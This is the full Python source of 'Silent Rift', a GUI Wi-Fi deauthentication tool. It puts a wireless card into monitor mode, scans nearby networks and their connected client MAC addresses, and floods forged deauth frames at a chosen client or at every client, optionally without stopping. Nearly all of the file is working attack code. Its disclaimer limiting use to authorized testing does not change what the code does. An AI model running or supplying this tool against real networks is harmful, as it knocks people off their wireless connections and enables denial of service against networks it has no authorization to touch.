import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import sys
import os
import subprocess
import signal
import platform
import threading
import re
import time
from scapy.all import sniff, sendp
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Dot11Beacon, Dot11Elt
import webbrowser

class SilentRiftGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Silent Rift - Wi-Fi Deauthentication Program")
        self.root.geometry("1100x750")
        self.root.configure(bg="#1e1e1e")
        
        self.attack_thread = None
        self.stop_event = threading.Event()
        self.target_ssid = ""
        self.networks = []
        self.clients = []
        
        self.create_gui()
        self.check_requirements()
        self.scan_interfaces()

    def create_gui(self):
        style = ttk.Style()
        style.theme_use('clam')
        style.configure("TButton", font=("Helvetica", 10, "bold"), padding=6, background="#3a3a3a", foreground="white")
        style.configure("TLabel", font=("Helvetica", 10), background="#1e1e1e", foreground="#ffffff")
        style.configure("Treeview", background="#2b2b2b", foreground="white", fieldbackground="#2b2b2b")
        style.configure("Treeview.Heading", font=("Helvetica", 10, "bold"))
        style.configure("TNotebook", background="#1e1e1e", foreground="white")
        style.configure("TNotebook.Tab", font=("Helvetica", 10, "bold"), padding=[10, 4])
        style.configure("Monitor.TLabel", background="#1e1e1e", foreground="#00ff00")
        style.configure("Managed.TLabel", background="#1e1e1e", foreground="#ff4444")
        style.configure("Link.TButton", font=("Helvetica", 10, "underline"), foreground="#00b7eb", background="#1e1e1e")
        style.configure("Vertical.TScrollbar", background="#1e1e1e", troughcolor="#2b2b2b")

        header_frame = ttk.Frame(self.root, relief="raised", borderwidth=2)
        header_frame.pack(fill="x", pady=(10, 5), padx=10)
        ttk.Label(header_frame, text="Silent Rift", font=("Helvetica", 16, "bold"), 
                 foreground="#00ff00").pack(pady=5)
        ttk.Label(header_frame, text="Wi-Fi Deauthentication Program", 
                 font=("Helvetica", 12), foreground="#ffffff").pack()

        main_frame = ttk.Frame(self.root)
        main_frame.pack(padx=10, pady=10, fill="both", expand=True)

        left_panel = ttk.Frame(main_frame, relief="groove", borderwidth=1)
        left_panel.pack(side="left", fill="y", padx=(0, 5), pady=5)

        interface_frame = ttk.LabelFrame(left_panel, text="Interface Control")
        interface_frame.pack(fill="x", pady=5, padx=5)
        
        ttk.Label(interface_frame, text="Interface:").pack(padx=5, pady=2, anchor="w")
        self.interface_combo = ttk.Combobox(interface_frame, state="readonly", width=25)
        self.interface_combo.pack(padx=5, pady=2, fill="x")
        self.interface_combo.bind("<<ComboboxSelected>>", self.update_interface_status)
        
        self.status_label = ttk.Label(interface_frame, text="Status: Unknown", style="Managed.TLabel")
        self.status_label.pack(padx=5, pady=2, anchor="w")
        
        self.monitor_btn = ttk.Button(interface_frame, text="Switch to Monitor Mode", 
                                    command=self.enable_monitor_mode)
        self.monitor_btn.pack(pady=5)

        target_frame = ttk.LabelFrame(left_panel, text="Target Selection")
        target_frame.pack(fill="x", pady=5, padx=5)
        
        ttk.Label(target_frame, text="Target SSID:").pack(padx=5, pady=2, anchor="w")
        self.target_entry = ttk.Entry(target_frame, width=25)
        self.target_entry.pack(padx=5, pady=2, fill="x")

        attack_frame = ttk.LabelFrame(left_panel, text="Attack Configuration")
        attack_frame.pack(fill="x", pady=5, padx=5)
        
        ttk.Label(attack_frame, text="Attack Mode:").pack(padx=5, pady=2, anchor="w")
        self.attack_mode = ttk.Combobox(attack_frame, 
                                      values=["Single Client (Specific MAC)", "All Clients (Broadcast)"],
                                      state="readonly", width=25)
        self.attack_mode.set("Single Client (Specific MAC)")
        self.attack_mode.pack(padx=5, pady=2, fill="x")
        self.attack_mode.bind("<<ComboboxSelected>>", self.toggle_mac_input)
        
        ttk.Label(attack_frame, text="Client MAC:").pack(padx=5, pady=2, anchor="w")
        self.mac_entry = ttk.Entry(attack_frame, width=25)
        self.mac_entry.pack(padx=5, pady=2, fill="x")
        
        ttk.Label(attack_frame, text="Packet Count (0 = Continuous):").pack(padx=5, pady=2, anchor="w")
        self.packet_count = ttk.Entry(attack_frame, width=10)
        self.packet_count.insert(0, "0")
        self.packet_count.pack(padx=5, pady=2, fill="x")
        
        self.attack_btn = ttk.Button(attack_frame, text="Start Attack", command=self.start_attack)
        self.attack_btn.pack(pady=5)
        self.stop_btn = ttk.Button(attack_frame, text="Stop Attack", command=self.stop_attack)
        self.stop_btn.pack(pady=5)

        right_panel = ttk.Frame(main_frame, relief="groove", borderwidth=1)
        right_panel.pack(side="right", fill="both", expand=True, pady=5)

        self.main_notebook = ttk.Notebook(right_panel)
        self.main_notebook.pack(fill="both", expand=True, padx=5, pady=5)

        discovered_tab = ttk.Frame(self.main_notebook)
        self.main_notebook.add(discovered_tab, text="Discovered Information")
        
        discovered_frame = ttk.LabelFrame(discovered_tab, text="Network and Client Data")
        discovered_frame.pack(fill="both", expand=True, padx=5, pady=5)
        
        self.sub_notebook = ttk.Notebook(discovered_frame)
        self.sub_notebook.pack(fill="both", expand=True, padx=5, pady=5)

        # Networks Sub-Tab with Scrollbar
        network_tab = ttk.Frame(self.sub_notebook)
        self.sub_notebook.add(network_tab, text="Networks")
        
        network_frame = ttk.Frame(network_tab)
        network_frame.pack(fill="both", expand=True, padx=5, pady=5)
        
        self.network_tree = ttk.Treeview(network_frame, 
                                       columns=("No", "ESSID", "Power", "Channel", "BSSID"), 
                                       show="headings", height=10)
        for col in ("No", "ESSID", "Power", "Channel", "BSSID"):
            self.network_tree.heading(col, text=col)
        self.network_tree.column("No", width=40)
        self.network_tree.column("ESSID", width=250)
        self.network_tree.column("Power", width=80)
        self.network_tree.column("Channel", width=80)
        self.network_tree.column("BSSID", width=200)
        
        network_scrollbar = ttk.Scrollbar(network_frame, orient="vertical", command=self.network_tree.yview, style="Vertical.TScrollbar")
        self.network_tree.configure(yscrollcommand=network_scrollbar.set)
        self.network_tree.pack(side="left", fill="both", expand=True)
        network_scrollbar.pack(side="right", fill="y")
        
        self.network_tree.bind("<<TreeviewSelect>>", self.on_network_select)
        ttk.Button(network_tab, text="Scan Networks", 
                  command=self.scan_networks_threaded).pack(pady=5)

        # Clients Sub-Tab with Scrollbar
        client_tab = ttk.Frame(self.sub_notebook)
        self.sub_notebook.add(client_tab, text="Clients")
        
        client_frame = ttk.Frame(client_tab)
        client_frame.pack(fill="both", expand=True, padx=5, pady=5)
        
        self.client_tree = ttk.Treeview(client_frame, 
                                      columns=("No", "MAC", "Associated BSSID"), 
                                      show="headings", height=10)
        for col in ("No", "MAC", "Associated BSSID"):
            self.client_tree.heading(col, text=col)
        self.client_tree.column("No", width=40)
        self.client_tree.column("MAC", width=300)
        self.client_tree.column("Associated BSSID", width=300)
        
        client_scrollbar = ttk.Scrollbar(client_frame, orient="vertical", command=self.client_tree.yview, style="Vertical.TScrollbar")
        self.client_tree.configure(yscrollcommand=client_scrollbar.set)
        self.client_tree.pack(side="left", fill="both", expand=True)
        client_scrollbar.pack(side="right", fill="y")
        
        self.client_tree.bind("<<TreeviewSelect>>", self.on_client_select)
        ttk.Button(client_tab, text="Scan Clients", 
                  command=self.scan_clients_threaded).pack(pady=5)

        # About Tab
        about_tab = ttk.Frame(self.main_notebook)
        self.main_notebook.add(about_tab, text="About")
        about_frame = ttk.Frame(about_tab)
        about_frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        ttk.Label(about_frame, text="Silent Rift", font=("Helvetica", 14, "bold"), 
                 foreground="#00ff00").pack(pady=5)
        ttk.Label(about_frame, text="A powerful Wi-Fi deauthentication program designed for educational and authorized security testing.", 
                 wraplength=500, justify="center").pack(pady=5)
        ttk.Label(about_frame, text="WARNING: Using this program to attack networks without explicit permission is ILLEGAL!\n"
                                   "Only use it on networks you own or are authorized to test.\n"
                                   "Misuse may result in serious legal consequences.\n"
                                   "The developer is not responsible for any unauthorized or harmful use.", 
                 foreground="red", font=("Helvetica", 10, "bold"), wraplength=500, justify="center").pack(pady=10)
        ttk.Label(about_frame, text="Created by: Rofi (Fixploit03)", font=("Helvetica", 11)).pack(pady=5)
        github_btn = ttk.Button(about_frame, text="GitHub: https://github.com/fixploit03/SilentRift", 
                              style="Link.TButton", command=lambda: webbrowser.open("https://github.com/fixploit03/SilentRift"))
        github_btn.pack(pady=5)

        # Console with Scrollbar
        console_frame = ttk.LabelFrame(right_panel, text="Operation Log")
        console_frame.pack(fill="both", expand=True, padx=5)
        console_inner_frame = ttk.Frame(console_frame)
        console_inner_frame.pack(fill="both", expand=True, padx=5, pady=5)
        
        self.console = scrolledtext.ScrolledText(console_inner_frame, height=15, bg="#252525", 
                                               fg="white", font=("Consolas", 10), wrap=tk.WORD)
        console_scrollbar = ttk.Scrollbar(console_inner_frame, orient="vertical", command=self.console.yview, style="Vertical.TScrollbar")
        self.console.configure(yscrollcommand=console_scrollbar.set)
        self.console.pack(side="left", fill="both", expand=True)
        console_scrollbar.pack(side="right", fill="y")

    def log(self, message, error=False):
        prefix = "[-] " if error else "[*] "
        self.console.insert(tk.END, f"{prefix}{message}\n")
        self.console.see(tk.END)

    def check_requirements(self):
        try:
            if platform.system() != "Linux":
                raise RuntimeError("This program requires a Linux system!")
            if os.getuid() != 0:
                raise PermissionError("Please run with sudo privileges!")
            for cmd in ["airmon-ng", "iwconfig"]:
                if subprocess.call(["which", cmd], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
                    raise FileNotFoundError(f"{cmd} not found! Install aircrack-ng and wireless-tools.")
        except (RuntimeError, PermissionError, FileNotFoundError) as e:
            self.log(str(e), error=True)
            messagebox.showerror("Fatal Error", str(e))
            sys.exit(1)
        except Exception as e:
            self.log(f"Unexpected error during requirements check: {e}", error=True)
            sys.exit(1)

    def scan_interfaces(self):
        try:
            interfaces = []
            iwconfig_output = subprocess.getoutput("iwconfig").split('\n\n')
            for block in iwconfig_output:
                if "no wireless extensions" not in block and block.strip():
                    interface = block.split()[0]
                    interfaces.append(interface)
            if not interfaces:
                raise ValueError("No wireless interfaces detected!")
            self.interface_combo["values"] = interfaces
            self.interface_combo.set(interfaces[0])
            self.update_interface_status()
            self.log(f"Detected interfaces: {', '.join(interfaces)}")
        except Exception as e:
            self.log(f"Error scanning interfaces: {e}", error=True)
            self.interface_combo["values"] = ["No interfaces found"]

    def update_interface_status(self, event=None):
        interface = self.interface_combo.get()
        if not interface:
            self.status_label.config(text="Status: No interface selected", style="Managed.TLabel")
            self.monitor_btn.config(state="disabled")
            return
        
        try:
            result = subprocess.getoutput(f"iwconfig {interface}")
            if "Mode:Monitor" in result:
                self.status_label.config(text="Status: Monitor", style="Monitor.TLabel")
                self.monitor_btn.config(text="Switch to Managed Mode", command=self.disable_monitor_mode)
            else:
                self.status_label.config(text="Status: Managed", style="Managed.TLabel")
                self.monitor_btn.config(text="Switch to Monitor Mode", command=self.enable_monitor_mode)
            self.monitor_btn.config(state="normal")
        except Exception as e:
            self.log(f"Error checking interface status: {e}", error=True)
            self.status_label.config(text="Status: Error", style="Managed.TLabel")

    def enable_monitor_mode(self):
        interface = self.interface_combo.get()
        if not interface:
            self.log("No interface selected!", error=True)
            return
        
        try:
            self.log(f"Enabling monitor mode on {interface}...")
            subprocess.run(["sudo", "airmon-ng", "check", "kill"], check=True, 
                         stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
            result = subprocess.run(["sudo", "airmon-ng", "start", interface], 
                                  capture_output=True, text=True, check=True)
            new_interface = self.get_current_interface(interface)
            self.interface_combo.set(new_interface)
            self.update_interface_status()
            self.log(f"Monitor mode enabled on {new_interface}")
        except subprocess.CalledProcessError as e:
            self.log(f"Failed to enable monitor mode: {e.stderr}", error=True)
        except Exception as e:
            self.log(f"Unexpected error enabling monitor mode: {e}", error=True)

    def disable_monitor_mode(self):
        interface = self.interface_combo.get()
        try:
            self.log(f"Switching {interface} to managed mode...")
            subprocess.run(["sudo", "airmon-ng", "stop", interface], check=True, 
                         stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
            subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], 
                         check=True, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
            self.update_interface_status()
            self.log(f"Interface {interface} restored to managed mode")
        except subprocess.CalledProcessError as e:
            self.log(f"Failed to disable monitor mode: {e.stderr}", error=True)
        except Exception as e:
            self.log(f"Unexpected error disabling monitor mode: {e}", error=True)

    def get_current_interface(self, original):
        try:
            iwconfig_output = subprocess.getoutput("iwconfig")
            for line in iwconfig_output.splitlines():
                if original in line or (original + "mon") in line:
                    return line.split()[0]
            return original
        except Exception as e:
            self.log(f"Error detecting current interface: {e}", error=True)
            return original

    def scan_networks_threaded(self):
        if "Monitor" not in self.status_label.cget("text"):
            self.log("Interface must be in Monitor mode to scan networks!", error=True)
            return
        threading.Thread(target=self.scan_networks, daemon=True).start()

    def scan_networks(self):
        interface = self.interface_combo.get()
        if not interface:
            self.log("Please select an interface first!", error=True)
            return
        
        self.network_tree.delete(*self.network_tree.get_children())
        self.networks.clear()
        
        def packet_handler(packet):
            if packet.haslayer(Dot11Beacon):
                try:
                    essid = packet[Dot11Elt].info.decode(errors='ignore').strip()
                    bssid = packet[Dot11].addr2
                    channel = packet[Dot11Beacon].network_stats().get('channel', 'N/A')
                    power = packet.dBm_AntSignal if hasattr(packet, 'dBm_AntSignal') else "N/A"
                    if essid and bssid and essid not in [n['essid'] for n in self.networks]:
                        self.networks.append({'essid': essid, 'bssid': bssid, 
                                            'channel': channel, 'power': power})
                except Exception as e:
                    self.log(f"Error parsing packet: {e}", error=True)
        
        try:
            self.log("Starting network scan...")
            for channel in range(1, 15):
                self.log(f"Scanning channel {channel}...")
                subprocess.run(["sudo", "iwconfig", interface, "channel", str(channel)], 
                             check=True, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
                sniff(iface=interface, prn=packet_handler, timeout=2)
            for i, network in enumerate(self.networks, 1):
                self.network_tree.insert("", "end", 
                                       values=(i, network['essid'], network['power'], 
                                              network['channel'], network['bssid']))
            self.log(f"Network scan completed - {len(self.networks)} networks found")
        except subprocess.CalledProcessError as e:
            self.log(f"Error setting channel: {e.stderr}", error=True)
        except Exception as e:
            self.log(f"Error during network scan: {e}", error=True)

    def scan_clients_threaded(self):
        if "Monitor" not in self.status_label.cget("text"):
            self.log("Interface must be in Monitor mode to scan clients!", error=True)
            return
        threading.Thread(target=self.scan_clients, daemon=True).start()

    def scan_clients(self):
        interface = self.interface_combo.get()
        target_ssid = self.target_entry.get().strip()
        
        if not interface:
            self.log("Please select an interface first!", error=True)
            return
        if not target_ssid:
            self.log("Please enter a target SSID first!", error=True)
            return
        
        target_network = next((n for n in self.networks if n['essid'] == target_ssid), None)
        if not target_network:
            self.log(f"Target SSID '{target_ssid}' not found in scanned networks!", error=True)
            return
        
        self.client_tree.delete(*self.client_tree.get_children())
        self.clients.clear()
        client_set = set()
        
        def packet_handler(packet):
            if packet.haslayer(Dot11) and packet.addr2 == target_network['bssid']:
                client_mac = packet.addr1
                if (client_mac != "ff:ff:ff:ff:ff:ff" and 
                    client_mac != target_network['bssid'] and 
                    client_mac not in client_set and 
                    re.match(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$", client_mac)):
                    client_set.add(client_mac)
                    self.clients.append({'mac': client_mac, 'bssid': target_network['bssid']})
        
        try:
            self.log(f"Scanning clients for {target_ssid} on channel {target_network['channel']}...")
            subprocess.run(["sudo", "iwconfig", interface, "channel", str(target_network['channel'])], 
                         check=True, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
            sniff(iface=interface, prn=packet_handler, timeout=15)
            for i, client in enumerate(self.clients, 1):
                self.client_tree.insert("", "end", 
                                      values=(i, client['mac'], client['bssid']))
            self.log(f"Client scan completed - {len(self.clients)} unique clients found")
        except subprocess.CalledProcessError as e:
            self.log(f"Error setting channel: {e.stderr}", error=True)
        except Exception as e:
            self.log(f"Error during client scan: {e}", error=True)

    def on_network_select(self, event):
        selected = self.network_tree.selection()
        if selected:
            values = self.network_tree.item(selected[0])['values']
            self.target_entry.delete(0, tk.END)
            self.target_entry.insert(0, values[1])

    def on_client_select(self, event):
        selected = self.client_tree.selection()
        if selected and "Single" in self.attack_mode.get():
            values = self.client_tree.item(selected[0])['values']
            self.mac_entry.delete(0, tk.END)
            self.mac_entry.insert(0, values[1])

    def toggle_mac_input(self, event):
        if "Single" in self.attack_mode.get():
            self.mac_entry.configure(state="normal")
        else:
            self.mac_entry.configure(state="disabled")
            self.mac_entry.delete(0, tk.END)

    def validate_mac(self, mac):
        return bool(re.match(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$", mac))

    def start_attack(self):
        if "Monitor" not in self.status_label.cget("text"):
            self.log("Interface must be in Monitor mode to start attack!", error=True)
            return
        
        interface = self.interface_combo.get()
        target_ssid = self.target_entry.get().strip()
        
        if not interface or not target_ssid:
            self.log("Please select an interface and enter a target SSID!", error=True)
            return
        
        target_network = next((n for n in self.networks if n['essid'] == target_ssid), None)
        if not target_network:
            self.log(f"Target SSID '{target_ssid}' not found in scanned networks!", error=True)
            return

        try:
            count = int(self.packet_count.get())
            if count < 0:
                raise ValueError("Packet count cannot be negative!")
        except ValueError as e:
            self.log(f"Invalid packet count: {e}", error=True)
            return

        mode = self.attack_mode.get()
        if "Single" in mode:
            client_mac = self.mac_entry.get().strip()
            if not client_mac or not self.validate_mac(client_mac):
                self.log("Please enter a valid MAC address for single client mode!", error=True)
                return
        else:
            client_mac = "ff:ff:ff:ff:ff:ff"

        self.target_ssid = target_ssid
        self.stop_event.clear()
        self.attack_thread = threading.Thread(
            target=self.perform_attack,
            args=(interface, target_network['bssid'], target_network['channel'], count, mode, client_mac),
            daemon=True
        )
        self.attack_thread.start()
        self.attack_btn.configure(state="disabled")
        self.stop_btn.configure(state="normal")
        self.log("Attack thread started")

    def perform_attack(self, interface, bssid, channel, count, mode, client_mac):
        try:
            subprocess.run(["sudo", "iwconfig", interface, "channel", str(channel)], 
                         check=True, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
            
            if "Single" in mode:
                self.log(f"Targeting client: {client_mac}")
                packet = RadioTap() / Dot11(addr1=client_mac, addr2=bssid, addr3=bssid) / Dot11Deauth()
            else:
                self.log("Targeting all clients (broadcast)")
                packet = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / Dot11Deauth()

            if count == 0:
                self.log(f"Starting continuous attack on {self.target_ssid}...")
                while not self.stop_event.is_set():
                    sendp(packet, iface=interface, count=1, verbose=False, inter=0.1)
                    time.sleep(0.1)
            else:
                self.log(f"Sending {count} packets to {self.target_ssid}...")
                for i in range(count):
                    if self.stop_event.is_set():
                        break
                    sendp(packet, iface=interface, count=1, verbose=False)
                    self.log(f"Sent packet {i+1}/{count}")
                self.log("Attack completed successfully")
        except subprocess.CalledProcessError as e:
            self.log(f"Error setting channel: {e.stderr}", error=True)
        except Exception as e:
            self.log(f"Error during attack: {e}", error=True)
        finally:
            self.root.after(0, self.attack_cleanup)

    def attack_cleanup(self):
        self.attack_btn.configure(state="normal")
        self.stop_btn.configure(state="normal")
        if self.stop_event.is_set():
            self.log("Attack stopped successfully")
        else:
            self.log("Attack finished or encountered an error")

    def stop_attack(self):
        if self.attack_thread and self.attack_thread.is_alive():
            self.log("Stopping attack...")
            self.stop_event.set()
            self.attack_thread.join(timeout=2)
            if self.attack_thread.is_alive():
                self.log("Attack thread did not stop in time, forcing termination", error=True)
            else:
                self.log("Attack thread stopped cleanly")
        else:
            self.log("No active attack to stop")
        self.attack_cleanup()

    def on_closing(self):
        if self.attack_thread and self.attack_thread.is_alive():
            self.stop_attack()
        
        interface = self.interface_combo.get()
        if interface and messagebox.askyesno("Exit", "Restore interface to managed mode?"):
            try:
                subprocess.run(["sudo", "airmon-ng", "stop", interface], 
                             check=True, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
                subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], 
                             check=True, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
                self.log("Interface restored to managed mode")
            except subprocess.CalledProcessError as e:
                self.log(f"Error restoring interface: {e.stderr}", error=True)
            except Exception as e:
                self.log(f"Unexpected error during cleanup: {e}", error=True)
        self.root.destroy()

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal.SIG_IGN)
    root = tk.Tk()
    app = SilentRiftGUI(root)
    root.protocol("WM_DELETE_WINDOW", app.on_closing)
    root.mainloop()
